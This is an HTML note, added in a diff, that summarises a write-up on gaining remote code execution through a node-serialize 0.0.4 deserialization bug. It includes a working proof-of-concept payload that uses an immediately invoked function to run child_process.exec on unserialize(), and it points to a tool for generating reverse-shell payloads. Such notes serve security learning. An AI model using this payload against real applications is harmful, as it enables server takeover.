@@ -1,0 +1,39 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Nodejs IIFE</title>
+</head><body>From https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/<br/>
+<br/>
+RCE can be obtained with Immediately Invoked Function Expression (IIFE)<br/>
+<br/>
+I have used node-serialize version 0.0.4 for this research. For successful exploitation, arbitrary code execution should occur when untrusted input is passed into unserialize() function. The best way to create a payload is to use the serialize() function of the same module.<br/>
+<br/>
+I created the following JavaScript object and passed it to serialize() function.<br/>
+var y = {<br/>
+&nbsp;rce : function(){<br/>
+&nbsp;require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });<br/>
+&nbsp;},<br/>
+}<br/>
+var serialize = require('node-serialize');<br/>
+console.log("Serialized: \n" + serialize.serialize(y));<br/>
+<br/>
+Which gives the following output.<br/>
+<br/>
+<img src="image.png" /><br/>
+<br/>
+the problem is code execution won’t happen until you trigger the function corresponding to the rce property of the object.<br/>
+<br/>
+Later I figured out that we can use JavaScript’s <a href="https://en.wikipedia.org/wiki/Immediately-invoked_function_expression)">Immediately invoked function expression (IIFE)</a>&nbsp;for calling the function. If we use IIFE bracket ()after the function body, the function will get invoked when the object is created. It works similar to a Class constructor in C++.<br/>
+<br/>
+Now the serialize() function with the modified object code is called.<br/>
+<br/>
+oS we have the exploit payload:<br/>
+<br/>
+{"rce":"_$$ND_FUNC$$_function (){\n \t require('child_process').exec('ls /',<br/>
+function(error, stdout, stderr) { console.log(stdout) });\n }()"}<br/>
+<br/>
+Passing it to unserialize() function will result in code execution.<br/>
+<br/>
+<br/>
+You can use something like <a href="https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py">nodejsshell.py</a>&nbsp;for a reverse shell payload generation. Just make sure you make the function into an IIFE and call it appropriately. </body></html>
